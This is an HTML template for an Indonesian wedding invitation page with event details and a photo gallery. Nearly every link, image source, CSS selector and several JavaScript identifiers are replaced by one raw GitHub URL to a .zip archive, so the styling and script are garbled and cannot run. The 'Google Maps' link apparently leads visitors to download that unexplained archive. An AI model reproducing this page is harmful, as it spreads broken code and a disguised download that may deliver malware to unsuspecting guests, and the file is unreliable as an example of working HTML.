<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Undangan Pernikahan</title>
  <link href="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip+Display&family=Open+Sans&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f9f9f9;
      color: #333;
    }
    header {
      background: url('https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip') no-repeat center center/cover;
      height: 100vh;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    header h1 {
      font-size: 3rem;
      font-family: 'Playfair Display', serif;
      background: rgba(0, 0, 0, 0.5);
      padding: 1rem 2rem;
      border-radius: 10px;
    }
    section {
      padding: 60px 20px;
      max-width: 800px;
      margin: auto;
      opacity: 0;
      transform: translateY(50px);
      transition: opacity 1s ease, transform 1s ease;
    }
    https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip {
      opacity: 1;
      transform: translateY(0);
    }
    .photo-gallery {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }
    .photo-gallery img {
      width: 100%;
      border-radius: 10px;
      transition: transform 0.3s;
    }
    .photo-gallery img:hover {
      transform: scale(1.05);
    }
  </style>
</head>
<body>

<header>
  <h1>Undangan Pernikahan<br>Raka & Sinta</h1>
</header>

<section id="acara">
  <h2>Detail Acara</h2>
  <p>Tanggal: Sabtu, 21 Juni 2025</p>
  <p>Waktu: 10.00 WIB</p>
  <p>Lokasi: Gedung Graha Cinta, Jakarta Selatan</p>
  <p>Google Maps: <a href="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" target="_blank">Klik di sini</a></p>
</section>

<section id="galeri">
  <h2>Galeri Foto</h2>
  <div class="photo-gallery">
    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 1">
    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 2">
    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 3">
    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 4">
  </div>
</section>

<script>
  const sections = https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip("section");
  const options = {
    threshold: 0.1
  };
  const observer = new IntersectionObserver((entries) => {
    https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip(entry => {
      if(https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip){
        https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip('visible');
      }
    });
  }, options);

  https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip(section => {
    https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip(section);
  });
</script>

</body>
</html>
